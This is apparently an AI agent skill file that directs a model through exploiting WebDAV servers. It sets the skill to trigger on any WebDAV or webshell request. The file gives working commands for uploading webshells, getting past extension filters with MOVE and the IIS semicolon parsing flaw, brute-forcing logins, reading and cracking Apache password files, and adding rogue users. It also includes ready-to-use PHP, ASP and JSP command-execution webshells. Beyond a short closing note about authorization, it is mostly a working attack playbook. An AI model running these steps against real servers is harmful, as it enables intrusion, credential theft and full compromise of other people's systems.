---
name: webdav-pentesting
description: WebDAV server exploitation and pentesting. Use this skill whenever the user mentions WebDAV, HTTP file upload vulnerabilities, webshell deployment, PUT/MOVE request attacks, IIS WebDAV bypass, or needs to test WebDAV servers for security issues. Trigger on any request involving WebDAV enumeration, credential testing, file upload exploitation, or web server file manipulation.
---

# WebDAV Pentesting

A skill for exploiting WebDAV-enabled HTTP servers through file upload vulnerabilities, credential attacks, and webshell deployment.

## When to Use This Skill

Use this skill when:
- You need to test a WebDAV server for vulnerabilities
- You want to upload and execute files on a remote server
- You're dealing with HTTP Basic Authentication on WebDAV
- You need to bypass file extension restrictions
- You're investigating IIS5/6 WebDAV vulnerabilities
- You want to extract or crack WebDAV credentials

## Core Concepts

WebDAV (Web Distributed Authoring and Versioning) extends HTTP to allow clients to manage files on servers. When misconfigured, it can be exploited to:

1. **Upload arbitrary files** (including webshells)
2. **Execute server-side code** through uploaded files
3. **Bypass file extension restrictions** using MOVE requests or IIS vulnerabilities
4. **Extract credentials** from server configuration files

## Attack Workflow

### Step 1: Enumerate WebDAV Server

First, verify WebDAV is enabled and identify the server type:

```bash
# Check if WebDAV is enabled
curl -I http://<target-ip>/
# Look for: DAV: header or WebDAV-specific responses

# Test with davtest (automated extension testing)
davtest -url http://<target-ip>/
davtest -auth user:password -url http://<target-ip>/

# Try all extensions
davtest -sendbd auto -url http://<target-ip>/

# Test MOVE operations (upload .txt, rename to .php/.asp)
davtest -auth user:password -move -sendbd auto -url http://<target-ip>/
```

**What to look for:**
- Which file extensions are accepted
- Whether MOVE operations work (allows renaming uploaded files)
- Authentication requirements

### Step 2: Manual WebDAV Operations

Use `cadaver` for interactive WebDAV operations:

```bash
cadaver http://<target-ip>/
```

Common cadaver commands:
- `ls` - List files
- `put <local-file> <remote-file>` - Upload file
- `mv <source> <destination>` - Move/rename file
- `delete <file>` - Delete file
- `logout` - Exit

### Step 3: File Upload Techniques

#### Direct PUT Request

```bash
# Upload a file directly
curl -T 'shell.txt' 'http://<target-ip>/shell.txt'

# With authentication
curl -u user:password -T 'shell.php' 'http://<target-ip>/shell.php'
```

#### MOVE Request (Bypass Extension Restrictions)

If direct upload of executable extensions is blocked:

```bash
# Step 1: Upload as non-executable (e.g., .txt)
curl -T 'shell.txt' 'http://<target-ip>/shell.txt'

# Step 2: Rename to executable extension
curl -X MOVE \
  --header 'Destination:http://<target-ip>/shell.php' \
  'http://<target-ip>/shell.txt'

# With authentication
curl -u user:password -X MOVE \
  --header 'Destination:http://<target-ip>/shell.php' \
  'http://<target-ip>/shell.txt'
```

#### IIS5/6 WebDAV Bypass

IIS5/6 blocks `.asp` uploads but has a parsing vulnerability:

```bash
# Upload as .txt
curl -T 'shell.txt' 'http://<target-ip>/shell.txt'

# Move to .asp;.txt (IIS executes as .asp)
curl -X MOVE \
  --header 'Destination:http://<target-ip>/shell.asp;.txt' \
  'http://<target-ip>/shell.txt'

# Alternative: .asp;.html
curl -X MOVE \
  --header 'Destination:http://<target-ip>/shell.asp;.html' \
  'http://<target-ip>/shell.txt'
```

**Important:** The semicolon is critical - IIS ignores everything after `;` in the filename.

### Step 4: Credential Attacks

#### Brute Force WebDAV Authentication

```bash
# Using hydra
hydra -l <username> -P <wordlist> <target-ip> http-get /webdav/

# Using gobuster with wordlist
gobuster -u http://<target-ip>/webdav/ -w <wordlist> -x php,txt,asp
```

#### Extract Credentials from Apache

If you gain server access, check Apache WebDAV configuration:

```bash
# Find WebDAV configuration
cat /etc/apache2/sites-enabled/000-default

# Look for AuthUserFile directive
# Common location: /etc/apache2/users.password

# View credentials file
cat /etc/apache2/users.password
```

The file contains `username:hash` entries. Crack the hash:

```bash
# Using hashcat (identify hash type first)
hashcat -m <hash-type> /etc/apache2/users.password <wordlist>

# Using john
john /etc/apache2/users.password
```

#### Add New Credentials

If you can modify the password file:

```bash
# Add new user (prompts for password)
htpasswd /etc/apache2/users.password <new-username>

# Test new credentials
wget --user <new-username> --ask-password http://<target>/webdav/ -O - -q
```

## Webshell Templates

### PHP Webshell

```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

### ASP Webshell (for IIS)

```asp
<% 
If Request.QueryString("cmd") <> "" Then
    Set objShell = CreateObject("WScript.Shell")
    Set objExec = objShell.Exec(Request.QueryString("cmd"))
    Response.Write objExec.StdOut.ReadAll()
End If
%>
```

### JSP Webshell (for Java servers)

```jsp
<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) out.println(line);
  }
%>
```

## Common Scenarios

### Scenario 1: Anonymous WebDAV Access

```bash
# Test without authentication
davtest -url http://<target-ip>/

# If successful, upload and execute
curl -T 'shell.php' 'http://<target-ip>/shell.php'
```

### Scenario 2: Authenticated WebDAV with Extension Restrictions

```bash
# Test what works
davtest -auth user:password -move -sendbd auto -url http://<target-ip>/

# If .txt works but .php doesn't, use MOVE
curl -u user:password -T 'shell.txt' 'http://<target-ip>/shell.txt'
curl -u user:password -X MOVE \
  --header 'Destination:http://<target-ip>/shell.php' \
  'http://<target-ip>/shell.txt'
```

### Scenario 3: IIS5/6 with .asp Restrictions

```bash
# Upload as .txt
curl -u user:password -T 'shell.txt' 'http://<target-ip>/shell.txt'

# Bypass with .asp;.txt
curl -u user:password -X MOVE \
  --header 'Destination:http://<target-ip>/shell.asp;.txt' \
  'http://<target-ip>/shell.txt'

# Access the shell
http://<target-ip>/shell.asp;.txt?cmd=whoami
```

## Verification

After uploading a webshell, verify it works:

```bash
# Test PHP shell
curl 'http://<target-ip>/shell.php?cmd=whoami'

# Test ASP shell
curl 'http://<target-ip>/shell.asp?cmd=whoami'

# Test with authentication
curl -u user:password 'http://<target-ip>/shell.php?cmd=whoami'
```

## Tools Reference

| Tool | Purpose | Command |
|------|---------|--------|
| davtest | Automated WebDAV testing | `davtest -url http://<ip>/` |
| cadaver | Interactive WebDAV client | `cadaver http://<ip>/` |
| curl | HTTP requests (PUT/MOVE) | `curl -T file http://<ip>/` |
| hydra | Brute force authentication | `hydra -l user -P wordlist <ip> http-get` |
| htpasswd | Manage Apache password files | `htpasswd file user` |

## Safety Notes

- Only test systems you have authorization to assess
- WebDAV exploitation can lead to full server compromise
- Document all findings for reporting
- Clean up uploaded files after testing

## References

- [Exploiting WebDAV - vk9-sec.com](https://vk9-sec.com/exploiting-webdav/)
- [OWASP WebDAV Security](https://owasp.org/www-project-web-security-testing-guide/)
- [IIS WebDAV Vulnerabilities](https://www.exploit-db.com/)
